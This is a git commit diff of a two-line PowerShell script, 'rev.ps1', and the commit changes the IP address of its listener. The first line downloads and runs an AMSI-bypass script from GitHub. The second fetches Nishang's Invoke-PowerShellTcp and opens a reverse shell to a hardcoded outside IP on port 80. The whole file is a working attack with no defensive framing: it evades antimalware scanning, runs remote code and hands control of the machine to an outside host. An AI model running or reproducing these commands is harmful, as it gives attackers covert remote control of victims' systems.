214f2c50fa5909049e9a334d5210f3514e2c2693
fc-prashantsaini <92972358+fc-prashantsaini@users.noreply.github.com>
2024-06-12 13:03:35 +0530

    Update rev.ps1

--- rev.ps1
+++ rev.ps1
@@ -1,2 +1,2 @@
 iex (iwr -uri https://raw.githubusercontent.com/h0ru/AMSI-Reaper/main/src/AMSI-Reaper.ps1 -useb)
-iex (iwr -uri https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -useb);Invoke-PowerShellTcp -Reverse -IPAddress 103.154.252.98 -Port 80
+iex (iwr -uri https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -useb);Invoke-PowerShellTcp -Reverse -IPAddress 3.29.121.76 -Port 80
